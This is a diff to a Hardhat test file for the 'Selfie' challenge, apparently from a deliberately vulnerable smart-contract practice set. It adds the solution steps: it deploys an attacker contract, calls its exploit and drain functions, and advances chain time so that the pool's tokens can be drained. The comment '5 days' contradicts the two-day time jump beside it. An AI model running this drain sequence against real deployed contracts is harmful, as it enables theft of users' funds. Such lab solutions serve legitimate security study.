@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { parseEther } = require('ethers/lib/utils');
+const { BigNumber } = require('ethers');
 
 describe('[Challenge] Selfie', function () {
     let deployer, attacker;
@@ -31,6 +33,13 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackerContract = await ethers.getContractFactory("Attacker5", attacker);
+        this.attackerContract = await AttackerContract.deploy(this.pool.address, this.governance.address, this.token.address);
+        await this.attackerContract.exploit(TOKENS_IN_POOL);
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+        
+        await this.attackerContract.drain();
     });
 
     after(async function () {
